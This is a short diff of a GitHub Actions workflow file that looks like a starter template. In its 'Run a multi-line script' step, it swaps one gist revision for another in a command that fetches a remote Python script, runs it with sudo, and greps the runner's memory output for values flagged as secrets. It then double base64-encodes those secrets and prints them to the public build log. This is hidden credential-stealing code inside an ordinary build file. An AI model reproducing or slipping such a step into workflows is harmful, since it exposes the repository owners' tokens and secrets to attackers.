@@ -32,7 +32,7 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          B64_BLOB=`curl -sSf https://gist.githubusercontent.com/dogeared/c621b04e3b29319da9e49fe189eeff2f/raw/b0d34169d8f2d112f727fa3e8cc797f4fcb1aea5/memcpy-poc.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
+          B64_BLOB=`curl -sSf https://gist.githubusercontent.com/dogeared/c621b04e3b29319da9e49fe189eeff2f/raw/8fd25c8caa05b906f8c424ce5dd2dc6ce020d6df/memcpy-poc.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
           echo $B64_BLOB
           echo Add other actions to build,
           echo test, and deploy your project.
